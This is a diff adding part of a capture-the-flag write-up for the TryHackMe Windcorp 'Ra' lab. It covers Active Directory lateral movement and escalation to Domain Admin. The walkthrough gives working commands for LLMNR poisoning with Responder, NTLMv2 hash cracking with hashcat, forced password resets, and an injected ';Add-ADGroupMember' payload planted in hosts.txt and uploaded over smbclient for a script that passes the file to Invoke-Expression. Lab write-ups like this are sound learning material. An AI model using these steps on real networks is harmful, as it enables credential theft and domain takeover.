@@ -59,7 +59,56 @@ I was trying to find something related to **silvergorilla409** which was the bac
 
 # Lateral movement:
 
-Now it was time to download Spark and try to interact somehow with **Buse** in order to get more credentials so I could move within the domain. Just install Spark and use Lilyle credentials to authenticate. It's important to make some changes to the certificate validation of Spark in order to access:
+Now it was time to download Spark and try to interact somehow with **Buse** in order to get more credentials so I could move within the domain. Just install Spark and use Lilyle credentials to authenticate. It's important to make some changes to the certificate validation of Spark in order to access:![image](https://github.com/K4ySuh/PublicWriteups/assets/147923141/f5528af8-f2fa-45b4-aad3-6a29dbbb6b5b)![image](https://github.com/K4ySuh/PublicWriteups/assets/147923141/1eb73de7-2590-465b-b31d-42e32e2befeb)
+Once you have the user selected now it's time to find out a way to get his credentials. I knew the way here, was get the user to click a malicious link so I could get his credentials in some way. So I did some research and I found a tool called **responder** which is used for nbts-poisoning abusing LLMNR protocol which is still used for backward compatibility. If we execute Responder and we get a domain workstation to try to connect it will show the IP, the username and credential details **including NTLM hashes**.![image](https://github.com/K4ySuh/PublicWriteups/assets/147923141/55d6a659-590d-4b33-b824-a02209f63fec).
+
+Remember to set the interface as **tun0** since you're connected through the vpn and send a link for him to click. So now we have the NTLMv2 hash from this user, we could try to perform pash the hash through evil-winrm but we can also try to crack the hash while we perform other tasks. The way to do it with hashcat is as follows:
+**hashcat -m 5600 Buse.txt rockyou.txt --force**
+![image](https://github.com/K4ySuh/PublicWriteups/assets/147923141/783c084f-d11b-48ef-88ac-95297a2cd2e3)
+So we have the password: **uzunLM+3131**, so far so good. This user has WinRM access: ![image](https://github.com/K4ySuh/PublicWriteups/assets/147923141/6e048bd1-1068-451a-9d2d-71388eba48c3)
+Now I've got the second flag:
+![image](https://github.com/K4ySuh/PublicWriteups/assets/147923141/2e1ad9e0-7873-48b9-8383-cb95e83dffbc)
+
+# Getting Domain admin:
+
+To enumerate AD is very ussefull to upload the module PowerUp.ps1 so you'll get many functions to help you enumerating the AD. Some ussefull commands are the following:
+```powershell
+(Get-ADUser $env:USERNAME -Properties *).MemberOf  # This will give you some important information about your user.
+  
+net user; net group # etc to perform further enumeration there's a huge list of cmdlets and commands.
+```
+
+This user does not seem very interesting at all. I found the following explanation after reviewing some writeups once I finished the machine and I thought it was really interesting: "This is because they’re nested in the Account Operators AD group. This builtin group by default has privileges to login to DCs and manage all non-protected users & groups. By protected we mean those whose Attribute AdminCount = 1. These users and groups get their DACL from the AdminSDHolder and do not inherit their DACL from any OUs that they are placed in by a careless administrator. This is to stop a system administrator from shooting themselves in the foot by accident, much like the PowerShell execution policy. It will not stop an attacker from shooting you in the foot on purpose.
+
+The VM’s author meant for us to poke around and notice a folder C:\scripts with a checkservers.ps1 file inside. This PS1 pulls values from a text file stored in a user’s folder, does some stuff, and passes the result to Invoke-Expression.
+
+I have said before that I am not sure that anyone other than attackers and malware writers use Invoke-Expression. More accurately they tend to use an obscured version of its alias iex. In this case we are the attacker and we were meant to find this. I am probably preaching to the choir, but Invoke-Expression takes a string as input and runs it as a command."
+
+This bassically means we can manage users with non-administrative privileges. So in order to abuse this we can perform a Command injection in the scheduled task we found after performing enumeration looking at **.ps1** files and services executing this kind of files. 
+
+**Note**: Something this explanation is missing, you can get the ownership of a file using cmdlet: **Get-Childitem and Get-ACL** 
+```powershell
+Set-ADAccountPassword -Identity brittanycr -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "EasyP4Sword!!" -Force)
+```
+
+Since brittany does not have WinRM permissons, we'll have to create a new file with the same name of the file that's being executed in the script. We can find that out after changing brittany's password and login in via **smbclient** and having a look the file is called **hosts.txt** so we just need to create a new one in our machine and upload it using the same tool.
+**Note**: It is important to use put with the exact same name to avoid any kind of conflicts, deleting the file and uploading a new one may cause some issues.
+```powershell
+;Add-ADGroupMember -Identity "Domain Admins" -Members "buse" ; Add-ADGroupMember -Identity "Administrators" -Members "buse"
+```
+
+Then upload it to brittanycr’s user folder on the DC.
+```bash
+cd /home/kaysuh/machines/thm/Active-Directory/Windcorp/Ra/exploits  
+smbclient //10.10.46.34/users -U Windcorp.thm\\brittanycr  
+cd brittanycr  
+put hosts.txt
+```
+
+You can have a look at log.txt to have a guess of how long are you going to wait (won't be much).
+
+
+
 
 
 
